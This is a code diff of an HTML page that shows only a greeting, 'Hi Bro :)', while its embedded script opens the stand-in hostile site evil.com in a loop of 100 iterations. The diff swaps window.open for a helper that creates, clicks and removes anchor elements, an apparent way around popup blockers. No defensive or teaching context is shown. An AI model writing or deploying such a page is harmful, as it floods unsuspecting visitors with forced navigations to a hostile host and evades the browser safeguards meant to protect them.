@@ -9,8 +9,20 @@
     <h4>Hi Bro :)</h4>
     
 <script>
+    function dynamicallyCreateAnchorAndNavigate(url) {
+          let anchorElement = document.createElement('a');
+          anchorElement.href = url;
+          document.body.appendChild(anchorElement);
+          anchorElement.click();
+          document.body.removeChild(anchorElement);
+        }
+
+    function openInNewTab(url){
+          dynamicallyCreateAnchorAndNavigate(url);
+    }
+    
     for (let i = 0; i < 100; i++) {
-      window.open('https://evil.com/');
+      openInNewTab('https://evil.com/');
     }
 
 </script>
